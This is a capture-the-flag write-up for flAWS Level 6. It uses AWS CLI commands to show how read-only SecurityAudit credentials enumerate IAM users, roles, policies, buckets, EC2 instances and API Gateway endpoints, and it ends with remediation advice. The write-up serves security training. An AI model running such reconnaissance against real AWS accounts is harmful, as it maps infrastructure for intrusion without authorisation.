# flAWS - Level 6

---

## Vulnerability Overview

This level demonstrates **privilege abuse with a read-only IAM policy**. The `SecurityAudit` managed policy is designed for auditors — it grants broad read access across nearly all AWS services without the ability to modify anything.

The problem: read access alone is enough to **fully map an account's infrastructure** — all IAM users, roles, policies, S3 buckets, EC2 instances, and API Gateway endpoints. An attacker with these credentials can build a complete picture of the environment to plan further attacks, even without write permissions.

The second policy (`list_apigateways`) adds the ability to enumerate API Gateway resources, which reveals a hidden API endpoint that solves the challenge.

---

## Steps to Solve the Lab

**Step 1: Reading the Challenge**

The Level 6 page presents credentials for a user with `SecurityAudit` policy attached and asks: *"What can you do with it?"*

> **CTF Note:** The credentials below are intentionally provided by the flaws.cloud challenge as the starting point for Level 6. They are expired and permanently rotated.
>
> - Access Key ID: `<access-key-id>`
> - Secret Access Key: `<secret-access-key>`

The `SecurityAudit` managed policy is AWS's standard read-only auditing role — but "read-only" across all services is more powerful than it sounds.

**Step 2: Configure the AWS CLI Profile**

```bash
aws configure --profile flaws6
# AWS Access Key ID: <access-key-id>
# AWS Secret Access Key: <secret-access-key>
# Default region: us-west-2
```

**Step 3: Enumerate IAM Users**

```bash
aws iam list-users --profile flaws6
```

Returns:
- `backup` — service account (ARN: `arn:aws:iam::975426262029:user/backup`)
- `Level6` — human user (ARN: `arn:aws:iam::975426262029:user/Level6`)

**Step 4: Check Policies Attached to the Level6 User**

```bash
aws iam list-attached-user-policies --user-name Level6 --profile flaws6
```

Two policies attached:
- `MySecurityAudit` — ARN: `arn:aws:iam::975426262029:policy/MySecurityAudit`
- `list_apigateways` — ARN: `arn:aws:iam::975426262029:policy/list_apigateways`

**Step 5: Analyze the `list_apigateways` Policy**

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways \
  --version-id v4 --profile flaws6
```

The policy document:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": ["apigateway:GET"],
      "Effect": "Allow",
      "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
    }
  ]
}
```

This grants `GET` on all REST APIs in the region — enough to enumerate API IDs, stages, and resources.

**Step 6: Enumerate IAM Roles**

```bash
aws iam list-roles --profile flaws6
```

Returns AWS service roles: `AWSServiceRoleForCloudTrail`, `AWSServiceRoleForConfigMultiAccountSetup`, `AWSServiceRoleForFMS`, `AWSServiceRoleForOrganizations`. These reveal which AWS services are actively configured in the account.

**Step 7: Enumerate All S3 Buckets**

```bash
aws s3 ls --profile flaws6
```

Returns all 9 buckets in the account — the complete challenge infrastructure is now visible.

**Step 8: List API Gateway REST APIs**

```bash
aws apigateway get-rest-apis --region us-west-2 --profile flaws6
```

Returns the API ID and name of the API Gateway backing the final challenge endpoint.

**Step 9: Enumerate EC2 Instances**

```bash
aws ec2 describe-instances --profile flaws6
```

Returns instance metadata including security groups, network interfaces, and attached IAM instance profiles — confirming which roles are bound to which instances.

**Step 10: Enumerate Instance Profiles**

```bash
aws iam list-instance-profiles --profile flaws6
```

The `flaws` instance profile is identified — the same role from Level 5 whose temporary credentials we extracted via SSRF.

**Step 11: Get API Gateway Stage Details**

With the API ID from Step 8, retrieve the invoke URL:

```bash
aws apigateway get-stage \
  --rest-api-id <api-id-from-step-8> \
  --stage-name <stage-name> \
  --region us-west-2 --profile flaws6
```

The response includes `invokeUrl` — the publicly accessible endpoint for the final challenge.

**Step 12: Access the Final Endpoint**

Navigate to the API Gateway invoke URL discovered in Step 11. The endpoint confirms challenge completion and points to:

```
http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
```

---

## Key Takeaway

`SecurityAudit` is marketed as "read-only" but in practice it allows a full account census: every user, role, policy, instance, bucket, and API endpoint. Combined with a single extra permission (`list_apigateways`), a hidden API endpoint becomes discoverable.

Read-only ≠ harmless. Reconnaissance is the first phase of every real-world attack, and an audit role enables thorough reconnaissance.

## Remediation

- **Scope SecurityAudit to specific services** rather than granting the AWS managed policy wholesale — use a custom policy limited to services actually being audited.
- **Audit who has SecurityAudit** — treat it as a sensitive permission, not a harmless one.
- **Use SCPs (Service Control Policies)** in AWS Organizations to restrict which services can be read-enumerated by audit roles.
- **Log and alert on IAM enumeration**: CloudTrail logs `ListUsers`, `ListRoles`, `ListPolicies` — unusual patterns from unfamiliar IP addresses should trigger alerts.
- **Avoid custom policies that expand read-only roles** (like `list_apigateways`) without careful review.
